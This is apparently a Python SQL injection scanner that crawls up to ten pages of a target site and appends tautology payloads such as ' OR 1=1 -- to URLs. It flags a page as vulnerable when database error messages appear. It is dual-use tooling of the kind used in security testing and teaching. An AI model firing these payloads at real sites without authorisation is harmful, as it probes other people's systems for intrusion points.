import requests
from bs4 import BeautifulSoup as bs
from urllib.parse import urljoin, quote
import logging
from concurrent.futures import ThreadPoolExecutor

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

s = requests.Session()
s.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36"

visited_urls = set()
crawl_count = 0  # Counter for the number of URLs crawled

# Default payloads for testing SQL injection
default_payloads = ["' OR 1=1 --", "\" OR 1=1 --", "' OR 'a'='a", "\" OR \"a\"=\"a"]

def crawl_and_scan(url, payloads=default_payloads):
    global crawl_count
    results = []  # Store scan results
    if crawl_count >= 10:  # Stop crawling after 10 trials
        return results

    if url in visited_urls:
        return results

    try:
        res = s.get(url)
        res.raise_for_status()
    except requests.RequestException as e:
        logging.error(f"Error accessing {url}: {e}")
        return results

    visited_urls.add(url)
    crawl_count += 1  # Increment crawl_count after visiting a URL
    logging.info(f"Crawled URL #{crawl_count}: {url}")
    results.extend(scan_sql_injection(url, payloads))

    soup = bs(res.content, "html.parser")
    forms = get_all_forms(soup)
    for form in forms:
        form_details = get_form_details(form)
        action_url = urljoin(url, form_details["action"])
        results.extend(scan_sql_injection(action_url, payloads))

    # Recursively crawl all links on the page
    links = [a.get("href") for a in soup.find_all("a", href=True)]
    with ThreadPoolExecutor(max_workers=5) as executor:
        futures = [executor.submit(crawl_and_scan, urljoin(url, link), payloads) for link in links]
        for future in futures:
            results.extend(future.result())

    return results

def get_all_forms(soup):
    """Given a BeautifulSoup object, it returns all forms from the HTML content"""
    return soup.find_all("form")

def get_form_details(form):
    """This function extracts all possible useful information about an HTML form"""
    details = {}
    try:
        action = form.attrs.get("action").lower()
    except:
        action = None
    method = form.attrs.get("method", "get").lower()
    inputs = []
    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        input_value = input_tag.attrs.get("value", "")
        inputs.append({"type": input_type, "name": input_name, "value": input_value})
    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs
    return details

def is_vulnerable(response):
    """A simple boolean function that determines whether a page is SQL Injection vulnerable from its response"""
    errors = {
        "you have an error in your sql syntax;",
        "warning: mysql",
        "unclosed quotation mark after the character string",
        "quoted string not properly terminated",
    }
    for error in errors:
        if error in response.content.decode().lower():
            return True
    return False

def scan_sql_injection(url, payloads):
    results = []
    for payload in payloads:
        new_url = f"{url}{quote(payload)}"
        logging.info(f"Trying {new_url}")
        try:
            res = s.get(new_url)
            if is_vulnerable(res):
                logging.info(f"SQL Injection vulnerability detected, link: {new_url}")
                results.append(f"SQL Injection vulnerability detected, link: {new_url}")
                break
        except requests.RequestException as e:
            logging.error(f"Error: {e}")
    return results

if __name__ == "__main__":
    import sys
    if len(sys.argv) < 2:
        logging.error("Usage: python sql_injection_scanning.py <url> [<payload1> <payload2> ...]")
        sys.exit(1)

    url = sys.argv[1]
    payloads = sys.argv[2:] if len(sys.argv) > 2 else default_payloads
    scan_results = crawl_and_scan(url, payloads)
    logging.info(f"Scan results: {scan_results}")
